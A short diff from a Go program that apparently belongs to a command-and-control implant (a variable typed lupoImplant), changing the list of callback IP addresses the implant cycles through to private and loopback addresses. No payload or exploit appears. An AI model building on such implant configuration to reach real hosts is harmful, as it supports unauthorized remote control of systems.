@@ -37,7 +37,7 @@ var implant *lupoImplant
 func main() {
 
 
-	var ipList = []string{"192.168.3.165", "127.0.0.1", "10.0.0.3"}
+	var ipList = []string{"127.0.0.1", "10.0.0.0"}
 	var currentIPIndex = 0
 	var failureCount = 0
 	var updateInterval = 1
